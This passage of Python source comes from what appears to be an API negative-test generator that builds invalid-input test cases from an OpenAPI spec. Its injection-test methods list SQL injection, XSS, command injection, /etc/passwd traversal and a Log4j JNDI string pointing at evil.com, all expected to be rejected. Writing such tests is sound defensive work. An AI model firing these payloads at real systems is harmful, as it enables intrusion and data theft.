                    # Generate invalid enum values
                    invalid_enum_values = [
                        "INVALID_ENUM_VALUE",
                        "wrong_value",
                        "",
                        None,
                    ]

                    # Add variations based on valid enum values
                    string_enums = [v for v in enum_values if isinstance(v, str)]
                    if string_enums:
                        invalid_enum_values.extend([
                            string_enums[0].upper(),
                            string_enums[0] + "_invalid",
                        ])

                    for invalid_value in invalid_enum_values[:3]:  # Limit to 3
                        invalid_body = base_body.copy()
                        invalid_body[prop_name] = invalid_value

                        test_case = self._create_test_case(
                            endpoint=self._build_endpoint_path(endpoint),
                            method=endpoint["method"],
                            description=f"Test {prop_name} with invalid enum value: {invalid_value}",
                            body=invalid_body,
                            expected_status=400
                        )
                        test_cases.append(test_case)

        return test_cases

    async def _generate_nested_object_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests for invalid nested object structures."""
        test_cases = []

        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            nested_tests = await self._generate_nested_body_tests(endpoint, api_spec)
            test_cases.extend(nested_tests)

        return test_cases

    async def _generate_nested_body_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests for nested object validation failures."""
        test_cases = []
        base_body = self._generate_base_valid_body(endpoint, api_spec)
        if not base_body:
            return test_cases

        request_body = endpoint["requestBody"]
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)

        if resolved_schema.get("type") == "object":
            properties = resolved_schema.get("properties", {})

            for prop_name, prop_schema in properties.items():
                if prop_schema.get("type") == "object":
                    # Test invalid nested object structures
                    invalid_nested_tests = [
                        {
                            "value": "not_an_object",
                            "description": f"Test {prop_name} with string instead of object"
                        },
                        {
                            "value": [],
                            "description": f"Test {prop_name} with array instead of object"
                        },
                        {
                            "value": None,
                            "description": f"Test {prop_name} with null instead of object"
                        },
                        {
                            "value": 123,
                            "description": f"Test {prop_name} with number instead of object"
                        },
                    ]

                    for test_data in invalid_nested_tests:
                        invalid_body = base_body.copy()
                        invalid_body[prop_name] = test_data["value"]

                        test_case = self._create_test_case(
                            endpoint=self._build_endpoint_path(endpoint),
                            method=endpoint["method"],
                            description=test_data["description"],
                            body=invalid_body,
                            expected_status=400
                        )
                        test_cases.append(test_case)

                    # Test missing required fields in nested objects
                    nested_required = prop_schema.get("required", [])
                    if nested_required:
                        for required_field in nested_required:
                            invalid_body = base_body.copy()
                            if isinstance(invalid_body.get(prop_name), dict):
                                nested_obj = invalid_body[prop_name].copy()
                                if required_field in nested_obj:
                                    del nested_obj[required_field]
                                    invalid_body[prop_name] = nested_obj

                                    test_case = self._create_test_case(
                                        endpoint=self._build_endpoint_path(endpoint),
                                        method=endpoint["method"],
                                        description=f"Test {prop_name}.{required_field} missing in nested object",
                                        body=invalid_body,
                                        expected_status=400
                                    )
                                    test_cases.append(test_case)

        return test_cases

    async def _generate_multiple_validation_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests that combine multiple validation failures."""
        test_cases = []

        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            multiple_failure_tests = await self._generate_multiple_failure_body_tests(endpoint, api_spec)
            test_cases.extend(multiple_failure_tests)

        return test_cases

    async def _generate_multiple_failure_body_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests with multiple validation failures combined."""
        test_cases = []
        base_body = self._generate_base_valid_body(endpoint, api_spec)
        if not base_body:
            return test_cases

        request_body = endpoint["requestBody"]
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)

        if resolved_schema.get("type") == "object":
            properties = resolved_schema.get("properties", {})

            # Test multiple constraint violations
            multi_violation_tests = [
                {
                    "description": "Multiple type mismatches",
                    "modifications": self._get_multiple_type_violations(properties)
                },
                {
                    "description": "Multiple boundary violations",
                    "modifications": self._get_multiple_boundary_violations(properties)
                },
                {
                    "description": "Multiple format violations",
                    "modifications": self._get_multiple_format_violations(properties)
                },
                {
                    "description": "Mixed validation failures",
                    "modifications": self._get_mixed_validation_failures(properties)
                },
            ]

            for test_data in multi_violation_tests:
                if test_data["modifications"]:
                    invalid_body = base_body.copy()
                    invalid_body.update(test_data["modifications"])

                    test_case = self._create_test_case(
                        endpoint=self._build_endpoint_path(endpoint),
                        method=endpoint["method"],
                        description=test_data["description"],
                        body=invalid_body,
                        expected_status=400
                    )
                    test_cases.append(test_case)

        return test_cases

    def _get_multiple_type_violations(self, properties: Dict[str, Any]) -> Dict[str, Any]:
        """Get modifications for multiple type violations."""
        modifications = {}

        for prop_name, prop_schema in list(properties.items())[:3]:  # Limit to 3
            expected_type = prop_schema.get("type", "string")
            wrong_values = self._get_all_wrong_type_values(expected_type)
            if wrong_values:
                modifications[prop_name] = wrong_values[0]

        return modifications

    def _get_multiple_boundary_violations(self, properties: Dict[str, Any]) -> Dict[str, Any]:
        """Get modifications for multiple boundary violations."""
        modifications = {}

        for prop_name, prop_schema in properties.items():
            prop_type = prop_schema.get("type", "string")

            # Numeric boundaries
            if prop_type in ["integer", "number"]:
                if "maximum" in prop_schema:
                    modifications[prop_name] = prop_schema["maximum"] + 1
                elif "minimum" in prop_schema:
                    modifications[prop_name] = prop_schema["minimum"] - 1

            # String boundaries
            elif prop_type == "string":
                if "maxLength" in prop_schema:
                    modifications[prop_name] = "x" * (prop_schema["maxLength"] + 1)
                elif "minLength" in prop_schema and prop_schema["minLength"] > 0:
                    modifications[prop_name] = "x" * (prop_schema["minLength"] - 1)

            # Array boundaries
            elif prop_type == "array":
                if "maxItems" in prop_schema:
                    modifications[prop_name] = ["item"] * (prop_schema["maxItems"] + 1)
                elif "minItems" in prop_schema and prop_schema["minItems"] > 0:
                    modifications[prop_name] = ["item"] * (prop_schema["minItems"] - 1)

            if len(modifications) >= 3:  # Limit to 3 violations
                break

        return modifications

    def _get_multiple_format_violations(self, properties: Dict[str, Any]) -> Dict[str, Any]:
        """Get modifications for multiple format violations."""
        modifications = {}

        for prop_name, prop_schema in properties.items():
            prop_format = prop_schema.get("format")
            if prop_format:
                invalid_values = self._get_format_specific_invalid_values(prop_format)
                if invalid_values:
                    modifications[prop_name] = invalid_values[0]

            if len(modifications) >= 3:  # Limit to 3 violations
                break

        return modifications

    def _get_mixed_validation_failures(self, properties: Dict[str, Any]) -> Dict[str, Any]:
        """Get modifications for mixed validation failures."""
        modifications = {}
        prop_list = list(properties.items())

        if len(prop_list) >= 1:
            # Type violation
            prop_name, prop_schema = prop_list[0]
            expected_type = prop_schema.get("type", "string")
            wrong_values = self._get_all_wrong_type_values(expected_type)
            if wrong_values:
                modifications[prop_name] = wrong_values[0]

        if len(prop_list) >= 2:
            # Boundary violation
            prop_name, prop_schema = prop_list[1]
            if prop_schema.get("type") == "string" and "maxLength" in prop_schema:
                modifications[prop_name] = "x" * (prop_schema["maxLength"] + 1)

        if len(prop_list) >= 3:
            # Format violation
            prop_name, prop_schema = prop_list[2]
            prop_format = prop_schema.get("format")
            if prop_format:
                invalid_values = self._get_format_specific_invalid_values(prop_format)
                if invalid_values:
                    modifications[prop_name] = invalid_values[0]

        return modifications

    async def _generate_content_type_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests with wrong content-types."""
        test_cases = []

        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            content_type_tests = await self._generate_wrong_content_type_tests(endpoint, api_spec)
            test_cases.extend(content_type_tests)

        return test_cases

    async def _generate_wrong_content_type_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests with various wrong content types."""
        test_cases = []
        base_body = self._generate_base_valid_body(endpoint, api_spec)

        if base_body:
            wrong_content_types = [
                ("text/plain", "Send JSON with text/plain content-type"),
                ("application/xml", "Send JSON with XML content-type"),
                ("multipart/form-data", "Send JSON with form-data content-type"),
                ("application/x-www-form-urlencoded", "Send JSON with form-encoded content-type"),
                ("image/jpeg", "Send JSON with image content-type"),
                ("application/octet-stream", "Send JSON with binary content-type"),
                ("", "Send JSON with empty content-type"),
                ("invalid/content-type", "Send JSON with invalid content-type"),
                ("application/json; charset=invalid", "Send JSON with invalid charset"),
            ]

            for content_type, description in wrong_content_types:
                headers = {
                    "Content-Type": content_type,
                    "Accept": "application/json"
                }

                test_case = self._create_test_case(
                    endpoint=self._build_endpoint_path(endpoint),
                    method=endpoint["method"],
                    description=description,
                    headers=headers,
                    body=base_body,
                    expected_status=415  # Unsupported Media Type
                )
                test_cases.append(test_case)

        return test_cases

    async def _generate_injection_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests with special characters and injection attempts."""
        test_cases = []

        # Test injection in parameters
        for param in endpoint["parameters"]:
            injection_tests = self._generate_parameter_injection_tests(param, endpoint, api_spec)
            test_cases.extend(injection_tests)

        # Test injection in request body
        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            body_injection_tests = await self._generate_body_injection_tests(endpoint, api_spec)
            test_cases.extend(body_injection_tests)

        return test_cases

    def _generate_parameter_injection_tests(
        self,
        param: Dict[str, Any],
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate injection tests for a parameter."""
        test_cases = []
        param_name = param["name"]

        injection_payloads = [
            # SQL Injection
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1; DELETE FROM users; --",
            "admin'--",
            "' UNION SELECT * FROM users --",

            # XSS
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",

            # Command Injection
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",

            # Path Traversal
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",

            # Special Characters
            "áéíóú",
            "测试中文",
            "🔥💻🚀",
            "\x00\x01\x02",
            "\n\r\t",
        ]

        for payload in injection_payloads[:10]:  # Limit to 10
            test_case = self._create_parameter_test_case(
                endpoint, param, payload,
                f"Test {param_name} with injection payload: {payload[:30]}...",
                400
            )
            test_cases.append(test_case)

        return test_cases

    async def _generate_body_injection_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate injection tests for request body fields."""
        test_cases = []
        base_body = self._generate_base_valid_body(endpoint, api_spec)
        if not base_body:
            return test_cases

        injection_payloads = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",  # Log4j
            "{{7*7}}",  # Template injection
            "javascript:alert(1)",
            "; cat /etc/passwd",
            "<img src=x onerror=alert(1)>",
        ]

        # Apply injection payloads to string fields
        request_body = endpoint["requestBody"]
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)

        if resolved_schema.get("type") == "object":
            properties = resolved_schema.get("properties", {})
            string_fields = [name for name, schema in properties.items()
                           if schema.get("type") == "string"]

            for field_name in string_fields[:3]:  # Limit to 3 fields
                for payload in injection_payloads[:5]:  # Limit to 5 payloads
                    invalid_body = base_body.copy()
                    invalid_body[field_name] = payload

                    test_case = self._create_test_case(
                        endpoint=self._build_endpoint_path(endpoint),
                        method=endpoint["method"],
                        description=f"Test {field_name} with injection payload: {payload[:30]}...",
                        body=invalid_body,
                        expected_status=400
                    )
                    test_cases.append(test_case)

        return test_cases

    async def _generate_patch_specific_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests specific to PATCH endpoints (partial updates)."""
        test_cases = []

        # Test invalid partial updates
        partial_update_tests = await self._generate_invalid_partial_updates(endpoint, api_spec)
        test_cases.extend(partial_update_tests)

        # Test PATCH with empty body
        empty_patch_test = self._create_test_case(
            endpoint=self._build_endpoint_path(endpoint),
            method="PATCH",
            description="Test PATCH with empty body",
            body={},
            expected_status=400
        )
        test_cases.append(empty_patch_test)

        # Test PATCH with null body
        null_patch_test = self._create_test_case(
            endpoint=self._build_endpoint_path(endpoint),
            method="PATCH",
            description="Test PATCH with null body",
            body=None,
            expected_status=400
        )
        test_cases.append(null_patch_test)

        return test_cases

    async def _generate_invalid_partial_updates(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate invalid partial update tests for PATCH."""
        test_cases = []

        request_body = endpoint["requestBody"]
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)

        if resolved_schema.get("type") == "object":
            properties = resolved_schema.get("properties", {})

            # Test partial updates with invalid individual fields
            for prop_name, prop_schema in list(properties.items())[:5]:  # Limit to 5
                prop_type = prop_schema.get("type", "string")

                # Test wrong type for single field
                wrong_values = self._get_all_wrong_type_values(prop_type)
                if wrong_values:
                    partial_body = {prop_name: wrong_values[0]}

                    test_case = self._create_test_case(
                        endpoint=self._build_endpoint_path(endpoint),
                        method="PATCH",
                        description=f"Test PATCH with invalid {prop_name} (wrong type)",
                        body=partial_body,
                        expected_status=400
                    )
                    test_cases.append(test_case)

                # Test boundary violations for single field
                if prop_type == "string" and "maxLength" in prop_schema:
                    partial_body = {prop_name: "x" * (prop_schema["maxLength"] + 1)}

                    test_case = self._create_test_case(
                        endpoint=self._build_endpoint_path(endpoint),
                        method="PATCH",
                        description=f"Test PATCH with invalid {prop_name} (length violation)",
                        body=partial_body,
                        expected_status=400
                    )
                    test_cases.append(test_case)

        return test_cases

    def _is_collection_endpoint(self, endpoint: Dict[str, Any]) -> bool:
        """Check if endpoint is a collection endpoint (list/search)."""
        path = endpoint["path"].lower()
        method = endpoint["method"].lower()

        # Collection endpoints typically:
        # - GET /resources (list all)
        # - GET /resources/search
        # - Have query parameters for filtering/sorting
        collection_indicators = [
            method == "get" and not any(param in path for param in ["{id}", "{uuid}", "/{", "/:"]),
            "search" in path,
            "filter" in path,
            len([p for p in endpoint["parameters"] if p.get("in") == "query"]) > 2,
        ]

        return any(collection_indicators)

    async def _generate_collection_endpoint_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests for collection endpoint invalid filters/sorting."""
        test_cases = []

        # Test invalid query parameters
        invalid_query_tests = self._generate_invalid_query_tests(endpoint, api_spec)
        test_cases.extend(invalid_query_tests)

        # Test malformed filter syntax
        filter_tests = self._generate_malformed_filter_tests(endpoint, api_spec)
        test_cases.extend(filter_tests)

        # Test invalid sorting parameters
        sort_tests = self._generate_invalid_sort_tests(endpoint, api_spec)
        test_cases.extend(sort_tests)

        return test_cases

    def _generate_invalid_query_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests with invalid query parameters."""
        test_cases = []

        # Common invalid query parameter scenarios
        invalid_query_scenarios = [
            {"limit": -1, "description": "Test with negative limit"},
            {"limit": "not_a_number", "description": "Test with non-numeric limit"},
            {"limit": 999999, "description": "Test with extremely large limit"},
            {"offset": -1, "description": "Test with negative offset"},
            {"offset": "invalid", "description": "Test with non-numeric offset"},
            {"page": 0, "description": "Test with zero page number"},
            {"page": -1, "description": "Test with negative page number"},
            {"size": 0, "description": "Test with zero page size"},
            {"size": -5, "description": "Test with negative page size"},
            {"sort": "invalid_field", "description": "Test with invalid sort field"},
            {"order": "invalid_order", "description": "Test with invalid sort order"},
            {"filter": "malformed)filter", "description": "Test with malformed filter syntax"},
        ]

        for scenario in invalid_query_scenarios:
            description = scenario.pop("description")
            query_params = scenario

            test_case = self._create_test_case(
                endpoint=self._build_endpoint_path(endpoint),
                method=endpoint["method"],
                description=description,
                query_params=query_params,
                expected_status=400
            )
            test_cases.append(test_case)

        return test_cases

    def _generate_malformed_filter_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests with malformed filter syntax."""
        test_cases = []

        malformed_filters = [
            "name eq 'test'",  # Missing quotes around value
            "name = test and",  # Incomplete expression
            "name == 'test'",   # Wrong operator
            "(name eq 'test'",  # Unmatched parenthesis
            "name eq 'test') and age gt 18",  # Unmatched parenthesis
            "invalid_field eq 'test'",  # Non-existent field
            "name regex '[invalid'",  # Invalid regex
            "age gt 'not_a_number'",  # Type mismatch
            "name in ('test',)",  # Trailing comma
            "name eq",  # Missing value
            "",  # Empty filter
            ";;;;",  # Invalid syntax
            "name eq 'test' && age > 18",  # Wrong boolean operator
        ]

        for malformed_filter in malformed_filters:
            query_params = {"filter": malformed_filter}

            test_case = self._create_test_case(
                endpoint=self._build_endpoint_path(endpoint),
                method=endpoint["method"],
                description=f"Test with malformed filter: {malformed_filter[:30]}...",
                query_params=query_params,
                expected_status=400
            )
            test_cases.append(test_case)

        return test_cases

    def _generate_invalid_sort_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests with invalid sorting parameters."""
        test_cases = []

        invalid_sort_scenarios = [
            {"sort": "nonexistent_field", "description": "Test sort by non-existent field"},
            {"sort": "name,", "description": "Test sort with trailing comma"},
            {"sort": ",name", "description": "Test sort with leading comma"},
            {"sort": "name,,age", "description": "Test sort with double comma"},
            {"sort": "name asc desc", "description": "Test sort with conflicting directions"},
            {"sort": "name invalid_direction", "description": "Test sort with invalid direction"},
            {"sort": "", "description": "Test sort with empty value"},
            {"sort": "name age", "description": "Test sort without proper separator"},
            {"order": "ascending", "description": "Test with wrong order value"},
            {"order": "descending", "description": "Test with wrong order value"},
            {"sort": "name", "order": "invalid", "description": "Test with invalid order parameter"},
        ]

        for scenario in invalid_sort_scenarios:
            description = scenario.pop("description")
            query_params = scenario

            test_case = self._create_test_case(
                endpoint=self._build_endpoint_path(endpoint),
                method=endpoint["method"],
                description=description,
                query_params=query_params,
                expected_status=400
            )
            test_cases.append(test_case)

        return test_cases

    async def _generate_enhanced_structural_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate enhanced structural malformation tests."""
        test_cases = []

        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            enhanced_malformed_tests = [
                {
                    "description": "Test with deeply nested malformed JSON",
                    "body": '{"valid": {"nested": {"malformed": value_without_quotes}}}',
                    "content_type": "application/json"
                },
                {
                    "description": "Test with JSON containing comments",
                    "body": '{"name": "test", /* comment */ "email": "test@example.com"}',
                    "content_type": "application/json"
                },
                {
                    "description": "Test with JSON containing single quotes",
                    "body": "{'name': 'test', 'email': 'test@example.com'}",
                    "content_type": "application/json"
                },
                {
                    "description": "Test with extremely large JSON",
                    "body": '{"data": "' + "x" * 1000000 + '"}',  # 1MB string
                    "content_type": "application/json"
                },
                {
                    "description": "Test with binary data as JSON",
                    "body": b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR',  # PNG header
                    "content_type": "application/json"
                },
                {
                    "description": "Test with XML in JSON content-type",
                    "body": '<?xml version="1.0"?><root><name>test</name></root>',
                    "content_type": "application/json"
                },
                {
                    "description": "Test with escaped JSON",
                    "body": '"{\"name\": \"test\", \"email\": \"test@example.com\"}"',
                    "content_type": "application/json"
                },
                {
                    "description": "Test with Unicode control characters",
                    "body": '{"name": "test\u0000\u0001\u0002", "email": "test@example.com"}',
                    "content_type": "application/json"
                },
                {
                    "description": "Test with mixed content encoding",
                    "body": '{"name": "test", "email": "test@example.com"}',
                    "content_type": "application/json; charset=utf-16"
                },
            ]

            for malformed_test in enhanced_malformed_tests:
                headers = {
                    "Content-Type": malformed_test["content_type"],
                    "Accept": "application/json"
                }

                test_case = self._create_test_case(
                    endpoint=self._build_endpoint_path(endpoint),
                    method=endpoint["method"],
                    description=malformed_test["description"],
                    headers=headers,
                    body=malformed_test["body"],
                    expected_status=400
                )
                test_cases.append(test_case)

        return test_cases

    def _create_parameter_test_case(
        self, 
        endpoint: Dict[str, Any], 
        param: Dict[str, Any], 
        invalid_value: Any, 
        description: str, 
        expected_status: int
    ) -> Dict[str, Any]:
        """Create a test case with an invalid parameter value."""
        headers = {"Content-Type": "application/json", "Accept": "application/json"}
        query_params = {}
        path_params = {}
        
        # Build all parameters, using the invalid value for the target parameter
        for p in endpoint["parameters"]:
            if p["name"] == param["name"]:
                value = invalid_value
            else:
                value = self._generate_valid_param_value(p)
            
            if p.get("in") == "query":
                query_params[p["name"]] = value
            elif p.get("in") == "path":
                path_params[p["name"]] = value
            elif p.get("in") == "header":
                headers[p["name"]] = value
        
        # Build the endpoint path
        actual_path = endpoint["path"]
        for param_name, param_value in path_params.items():
            actual_path = actual_path.replace(f"{{{param_name}}}", str(param_value))
        
        return self._create_test_case(
            endpoint=actual_path,
            method=endpoint["method"],
            description=description,
            headers=headers,
            query_params=query_params,
            expected_status=expected_status
        )
    
    def _generate_valid_param_value(self, param: Dict[str, Any]) -> Any:
        """Generate a valid value for a parameter (used when testing other invalid parameters)."""
        schema = param.get("schema", {})
        
        # Use example if provided
        if "example" in param:
            return param["example"]
        if "example" in schema:
            return schema["example"]
        
        # Generate based on type
        param_type = schema.get("type", "string")
        
        if param_type == "string":
            if "enum" in schema:
                return schema["enum"][0]
            return "valid_string"
        elif param_type == "integer":
            minimum = schema.get("minimum", 1)
            maximum = schema.get("maximum", 100)
            return max(minimum, min(maximum, 42))
        elif param_type == "number":
            minimum = schema.get("minimum", 1.0)
            maximum = schema.get("maximum", 100.0)
            return max(minimum, min(maximum, 42.5))
        elif param_type == "boolean":
            return True
        elif param_type == "array":
            return ["valid_item"]
        
        return "valid_value"
    
    def _generate_base_valid_body(self, endpoint: Dict[str, Any], api_spec: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Generate a base valid request body for the endpoint."""
        request_body = endpoint.get("requestBody", {})
        if not request_body:
            return None
        
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        if not json_content:
            return None
        
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)
        
        return self._generate_realistic_object(resolved_schema)
    
    def _resolve_schema_ref(self, schema: Dict[str, Any], api_spec: Dict[str, Any]) -> Dict[str, Any]:
        """Resolve $ref references in schemas."""
        if "$ref" in schema:
            ref_path = schema["$ref"]
            if ref_path.startswith("#/"):
                # Navigate to the referenced schema
                parts = ref_path[2:].split("/")
                resolved = api_spec
                for part in parts:
                    resolved = resolved.get(part, {})
                return resolved
        return schema
    
    def _generate_realistic_object(self, schema: Dict[str, Any]) -> Dict[str, Any]:
        """Generate a realistic object based on schema."""
        if schema.get("type") != "object":
            return self._get_schema_example(schema)
        
        properties = schema.get("properties", {})
        required = schema.get("required", [])
        
        obj = {}
        
        for prop_name, prop_schema in properties.items():
            # Always include required properties, sometimes include optional ones
            if prop_name in required or random.random() < 0.8:
                obj[prop_name] = self._generate_realistic_property_value(prop_name, prop_schema)
        
        return obj
    
    def _generate_realistic_property_value(self, prop_name: str, schema: Dict[str, Any]) -> Any:
        """Generate realistic values based on property names and schemas."""
        prop_name_lower = prop_name.lower()
        
        # Use existing example if available
        if "example" in schema:
            return schema["example"]
        
        # Generate realistic values based on property names
        if "email" in prop_name_lower:
            return f"user{random.randint(1, 999)}@example.com"
        elif "name" in prop_name_lower:
            if "first" in prop_name_lower:
                return random.choice(["John", "Jane", "Alice", "Bob", "Charlie"])
            elif "last" in prop_name_lower:
                return random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
            else:
                return "Test User"
        elif "phone" in prop_name_lower:
            return f"+1-555-{random.randint(100, 999)}-{random.randint(1000, 9999)}"
        elif "address" in prop_name_lower:
            return "123 Test Street, Test City, TC 12345"
        elif "age" in prop_name_lower:
            return random.randint(18, 80)
        elif "price" in prop_name_lower or "amount" in prop_name_lower:
            return round(random.uniform(10.0, 1000.0), 2)
        elif "date" in prop_name_lower:
            return (datetime.now() + timedelta(days=random.randint(-30, 30))).isoformat()
        elif "url" in prop_name_lower:
            return "https://example.com/test"
        elif "description" in prop_name_lower:
            return "This is a test description for the API endpoint."
        
        # Fall back to schema-based generation
        return self._get_schema_example(schema)
    
    def _build_endpoint_path(self, endpoint: Dict[str, Any]) -> str:
        """Build the endpoint path with valid path parameters."""
        path = endpoint["path"]
        parameters = endpoint["parameters"]
        
        # Replace path parameters with valid values
        for param in parameters:
            if param.get("in") == "path":
                param_name = param["name"]
                param_value = self._generate_valid_param_value(param)
                path = path.replace(f"{{{param_name}}}", str(param_value))
        
        return path
    
    def _create_test_case(
        self,
        endpoint: str,
        method: str,
        description: str,
        headers: Optional[Dict[str, str]] = None,
        query_params: Optional[Dict[str, Any]] = None,
        body: Optional[Any] = None,
        expected_status: int = 400
    ) -> Dict[str, Any]:
        """Create a standardized test case with configuration-based settings."""
        app_settings = get_application_settings()
        test_timeout = getattr(app_settings, 'test_execution_timeout', 600)
        
        return {
            'test_name': description,
            'test_type': 'functional-negative',
            'method': method.upper(),
            'path': endpoint,
            'headers': headers or {"Content-Type": "application/json", "Accept": "application/json"},
            'query_params': query_params or {},
            'body': body,
            'timeout': test_timeout,
            'expected_status_codes': [expected_status],
            'tags': ['functional', 'negative', f'{method.lower()}-method']
        }
    
    async def _generate_llm_negative_tests(
        self,
        endpoints: List[Dict[str, Any]],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """
        Generate creative negative test cases using LLM.
        
        LLM can generate more creative and context-aware negative tests
        that might not be covered by deterministic algorithms.
        """
        if not self.llm_enabled:
            return []
        
        test_cases = []
        
        for endpoint in endpoints:
            # Create a prompt for generating negative test cases
            prompt = f"""Generate 3 creative negative test cases for this API endpoint that would cause errors:

Endpoint: {endpoint['method']} {endpoint['path']}
Description: {endpoint.get('description', '')}

Focus on:
1. Edge cases that violate business logic
2. Security-related negative tests
3. Unusual combinations that might break the API

Return test cases that should result in 4xx error codes."""

            system_prompt = """You are an expert API tester specializing in negative testing.
Generate creative test cases that expose API weaknesses and edge cases.
Focus on realistic scenarios that developers might overlook."""

            # Get LLM suggestions
            llm_response = await self.enhance_with_llm(
                endpoint,
                prompt,
                system_prompt=system_prompt,
                temperature=0.8  # Higher temperature for more creative tests
            )
            
            # Convert LLM suggestions to test cases
            if isinstance(llm_response, dict):
                test_case = self._create_test_case(
                    endpoint=endpoint['path'],
                    method=endpoint['method'],
                    description=f"[LLM] Creative negative test",
                    body=llm_response.get('body'),
                    expected_status=llm_response.get('expected_status', 400)
                )
                test_cases.append(test_case)
            elif isinstance(llm_response, list):
                for idx, suggestion in enumerate(llm_response[:3]):
                    if isinstance(suggestion, dict):
                        test_case = self._create_test_case(
                            endpoint=endpoint['path'],
                            method=endpoint['method'],
                            description=f"[LLM] {suggestion.get('description', f'Creative negative test {idx+1}')}",
                            body=suggestion.get('body'),
                            expected_status=suggestion.get('expected_status', 400)
                        )
                        test_cases.append(test_case)
        
        return test_cases
